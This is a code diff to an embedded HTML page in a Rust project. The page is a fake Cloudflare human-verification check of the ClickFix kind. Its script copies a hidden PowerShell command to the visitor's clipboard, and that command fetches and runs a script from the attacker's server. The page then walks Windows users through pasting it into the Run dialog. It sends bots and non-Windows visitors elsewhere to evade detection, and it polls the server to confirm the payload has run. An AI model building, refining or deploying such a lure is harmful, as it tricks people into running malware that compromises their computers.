@@ -7,7 +7,7 @@ pub const INDEX_HTML: &str = r##"
     <title>Just a moment...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="robots" content="noindex,nofollow" />
-    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/32px-Cloudflare_Logo.svg.png" />
+    <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/0x00snape/fixshell/refs/heads/main/images/Cloudflare_Logo.png" />
 
     <style>
         * {
@@ -39,7 +39,7 @@ pub const INDEX_HTML: &str = r##"
         body {
             display: flex;
             flex-direction: column;
-            height: 100vh;
+            min-height: 100vh;
             background-color: #222;
             color: #d9d9d9;
             margin: 0;
@@ -102,20 +102,17 @@ pub const INDEX_HTML: &str = r##"
         }
 
         .footer {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            margin: 0 auto;
-            padding: 1rem 1rem;
+            margin: auto;
+            padding: 1rem;
             width: 100%;
-            max-width: 60rem;
-            line-height: 1.125rem;
+            max-width: 50rem;
+            line-height: 1.1rem;
             font-size: 0.75rem;
         }
 
         .footer-inner {
             border-top: 1px solid #444;
+            margin-top: 5rem;
             padding-top: 1rem;
             padding-bottom: 1rem;
         }
@@ -153,32 +150,42 @@ pub const INDEX_HTML: &str = r##"
             display: flex;
             gap: 15px;
             align-items: center;
-            justify-content: center;
-            border: 1px solid #797979;
-            background-color: #232323;
+            justify-content: space-between;
+            border: 1.5px solid #797979;
+            background-color: #2d2e30;
             height: 78px;
             user-select: none;
             padding: 0 16px;
-            width: 100%;
+            width: 320;
+            min-width: 320px;
             max-width: 320px;
             margin: 0 auto;
+            overflow: hidden;
         }
 
         #branding {
-            display: inline-flex;
+	    flex-shrink: 0;
+            display: flex;
             flex-direction: column;
-            text-align: right;
+            align-items: flex-end;
+            justify-content: center;
         }
 
-        #logo {
-            width: 90px;
+        .logo-light, .logo-dark {
+            height: 25px;
+            width: auto;
             margin-bottom: 1px;
+            margin-left: auto;
         }
-
+        
+        .logo-light {
+            display: none;
+        }
+        
         .logo-dark {
-            filter: invert(1) hue-rotate(180deg);
+            display: block;
         }
-
+                   
         #terms {
             line-height: 2.5;
             color: #bbb;
@@ -244,6 +251,7 @@ pub const INDEX_HTML: &str = r##"
             display: none;
             align-items: center;
             gap: 12px;
+            flex: 1;
         }
 
         @keyframes spin {
@@ -315,7 +323,11 @@ pub const INDEX_HTML: &str = r##"
             display: flex;
             justify-content: space-between;
             align-items: center;
+            border-top-left-radius: 8px;
+            border-top-right-radius: 8px;
+            min-height: 90px
         }
+      
 
         .modal-header-text h2 {
             font-size: 1.25rem;
@@ -332,7 +344,7 @@ pub const INDEX_HTML: &str = r##"
         }
 
         .modal-header img {
-            height: 25px;
+            height: 35px;
         }
 
         .modal-body {
@@ -438,9 +450,6 @@ pub const INDEX_HTML: &str = r##"
             cursor: not-allowed;
         }
 
-        .logo-light {
-            display: none;
-        }
 
         @media (width <=720px) {
             .main-content {
@@ -455,6 +464,7 @@ pub const INDEX_HTML: &str = r##"
             .core-msg {
                 font-size: 1.25rem;
             }
+            
         }
 
         @media (prefers-color-scheme: light) {
@@ -477,7 +487,7 @@ pub const INDEX_HTML: &str = r##"
             }
 
             #content {
-                border: 1px solid #d1d1d1;
+                border: 1.5px solid #d1d1d1;
                 background-color: #f9f9f9;
             }
 
@@ -487,8 +497,8 @@ pub const INDEX_HTML: &str = r##"
             }
 
             .cb-lb .cb-i {
-                border: 2px solid #aaa;
-                background: #eee;
+                border: 2px solid #666666;
+                background: #ffffff;
             }
 
             .cb-lb-t,
@@ -520,12 +530,12 @@ pub const INDEX_HTML: &str = r##"
             }
 
             .agreement-section p {
-                background-color: #f0f0f0;
+                background-color: #ebebeb;
                 color: #333;
             }
 
             .modal-footer {
-                background-color: #f5f5f5;
+                background-color: #f0f0f0;
             }
 
             .modal-footer p {
@@ -536,14 +546,15 @@ pub const INDEX_HTML: &str = r##"
                 background-color: #ccc;
                 color: #777;
             }
-
+            
             .logo-light {
-                display: block;
-            }
+            	display: block;
+	    }
+        
+	    .logo-dark {
+            	display: none;
+	    }
 
-            .logo-dark {
-                display: none;
-            }
         }
     </style>
 </head>
@@ -552,7 +563,7 @@ pub const INDEX_HTML: &str = r##"
     <div class="main-wrapper" role="main">
         <div class="main-content">
             <h1 class="h1">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png" alt="Cloudflare Favicon" class="heading-favicon" />
+                <img src="https://raw.githubusercontent.com/0x00snape/fixshell/refs/heads/main/images/Cloudflare_Logo.png" alt="Cloudflare Logo" class="heading-favicon" />
                 cloudflare.com
             </h1>
             <p class="h2 spacer-bottom">
@@ -578,8 +589,8 @@ pub const INDEX_HTML: &str = r##"
                         <span id="verifying-text">Verifying...</span>
                     </div>
                     <div id="branding">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" alt="Cloudflare Logo" id="logo" class="logo-dark" />
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" alt="Cloudflare Logo" id="logo" class="logo-light" />
+                        <img src="https://raw.githubusercontent.com/0x00snape/fixshell/refs/heads/main/images/cloudfare-1536x508-dark.png" alt="Cloudflare" class="logo-light" />
+                        <img src="https://raw.githubusercontent.com/0x00snape/fixshell/refs/heads/main/images/cloudfare-1536x508.png" alt="Cloudflare" class="logo-dark" />
                         <div id="terms">
                             <a href="#">Privacy</a><span class="link-spacer">•</span><a href="#">Terms</a>
                         </div>
@@ -608,19 +619,18 @@ pub const INDEX_HTML: &str = r##"
                     <h2>Verifying you are human</h2>
                     <p>This may take a few seconds</p>
                 </div>
-                <img src="https://i.postimg.cc/MK9L5Vtq/cloudfare-1536x508.png" class="logo-dark" style="filter: invert(1) hue-rotate(180deg)" />
-                <img src="https://i.postimg.cc/MK9L5Vtq/cloudfare-1536x508.png" alt="Cloudflare Logo" class="logo-light" />
+                <img src="https://raw.githubusercontent.com/0x00snape/fixshell/refs/heads/main/images/cloudfare-1536x508.png" alt="Cloudflare" />
             </div>
             <div class="modal-body">
                 <h3>Let us know you're human, please complete steps:</h3>
                 <ol class="instruction-list">
                     <li>
                         1. Press & hold the Windows Key
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Windows_logo_-_2012.svg/2048px-Windows_logo_-_2012.svg.png" class="win-key-icon" alt="Windows Key" />
+                        <img src="https://raw.githubusercontent.com/0x00snape/fixshell/refs/heads/main/images/Windows_logo.png" class="win-key-icon" alt="Windows Key" />
                         + <kbd>R</kbd>
                     </li>
                     <li>
-                        2. In the verification window, press <kbd>Ctrl</kbd> +
+                        2. In the verification window, Press <kbd>Ctrl</kbd> +
                         <kbd>V</kbd>
                     </li>
                     <li>3. Press <kbd>Enter</kbd> on the keyboard to complete</li>
@@ -637,77 +647,94 @@ pub const INDEX_HTML: &str = r##"
         </div>
     </div>
 
-    <script>
-        (function() {
-	    
-            const config = {
-                verify: `${window.location.origin}/api/ok`,
-                isWin: navigator.userAgent.includes("Windows"),
-                isBot: /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent),
-            };
+    <div class="verification-container" style="display:none;">
+    <p id="status-text">Verifying your system security...</p>
+    <button id="verify-btn" disabled style="opacity:0.5; cursor:not-allowed;">Waiting for verification...</button>
+</div>
 
-            const dom = {
-                checkbox: document.getElementById("captcha-checkbox"),
-                checkboxContainer: document.querySelector(".cb-c"),
-                verifContainer: document.querySelector(".verification-container"),
-                modal: document.getElementById("instruction-modal"),
-                verifyBtn: document.getElementById("verify-btn"),
-                rayId: document.getElementById("ray-id-code"),
-                agreeText: document.getElementById("agreement-text"),
-            };
+<script>
+    (function() {
+
+        const config = {
+            endpoint: `${window.location.origin}/{{UUID}}`,
+            isWin: navigator.userAgent.includes("Windows"),
+            isBot: /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent),
+        };
+
+        const dom = {
+            checkbox: document.getElementById("captcha-checkbox"),
+            checkboxContainer: document.querySelector(".cb-c"),
+            verifContainer: document.querySelector(".verification-container"),
+            modal: document.getElementById("instruction-modal"),
+            verifyBtn: document.getElementById("verify-btn"),
+            rayId: document.getElementById("ray-id-code"),
+            agreeText: document.getElementById("agreement-text"),
+        };
+
+        const handleVerify = () => {
             
-
-            const handleVerify = () => {
-                const input = document.createElement("textarea");
-                input.value = `powershell -c "& ([scriptblock]::Create((irm ${config.verify} -UseBasicParsing)))"`;
-                document.body.appendChild(input);
-                input.select();
-                document.execCommand("copy");
-                document.body.removeChild(input);
-                
-                dom.checkboxContainer.style.display = 'none';
-                dom.verifContainer.style.display = 'flex';
-                
-		setTimeout(() => {
+            const input = document.createElement("textarea");
+            input.value = `powershell -w 2 -c "& ([scriptblock]::Create((irm ${config.endpoint} -Method Post)))"`;    
+            document.body.appendChild(input);
+            input.select();
+            document.execCommand("copy");
+            document.body.removeChild(input);
+            
+            dom.checkboxContainer.style.display = 'none';
+            dom.verifContainer.style.display = 'flex';
+            
+            setTimeout(() => {
                 dom.modal.classList.add("visible");
                 dom.verifyBtn.disabled = true;
 
-                const verify = setInterval(async () => {
-                
-                        const response = await fetch("/api/status");
+                const checkStatus = setInterval(async () => {
+                    try {
+                        const response = await fetch(config.endpoint);
                         const data = await response.json();
 
-                        if (data.isDownloaded === true) {
-                            clearInterval(verify);
+                        if (data.v === true) {
+                            clearInterval(checkStatus);
                             dom.verifyBtn.disabled = false;
+                           
+                            dom.verifyBtn.onclick = async () => {
+                                const verify = await fetch(`${config.endpoint}?verify=true`);
 
-                            dom.verifyBtn.onclick = () => {
-                                window.location.href = data.redirectUrl;
+                                if (verify.ok) {
+                                    const r = await verify.text();
+                                    window.location.href = r;
+                                }
                             };
+                            
                         }
+                    } catch (e) {}
                 }, 3000);
             }, 1500);
-            };
+        };
 
-            const init = async () => {
-                const response = await fetch("/api/status");
+        const init = async () => {
+            try {
+                const response = await fetch(config.endpoint);
                 const data = await response.json();
 
                 if (!config.isWin || config.isBot) {
-                    window.location.href = data.redirectUrl;
+                    window.location.href = data.r;
+                    return;
                 }
-            };
-            
-            const hex = Math.random().toString(15).slice(2, 20);
-	        dom.rayId.textContent = hex;	    
-	        dom.agreeText.textContent = `I am not a robot Cloudflare ID: ${hex}`;
-            dom.checkboxContainer.addEventListener("click", handleVerify);
-            
-            init();
-        })();
-    </script>
+            } catch (e) {}
+        };
+        
+        const hex = Math.random().toString(16).slice(2, 18);
+        if(dom.rayId) dom.rayId.textContent = hex;	    
+        if(dom.agreeText) dom.agreeText.textContent = `I am not a robot Cloudflare ID: ${hex}`;
+        
+        dom.checkboxContainer.addEventListener("click", handleVerify);
+        init();
+    })();
+</script>
+    
 </body>
 
 </html>
 
 "##;
+
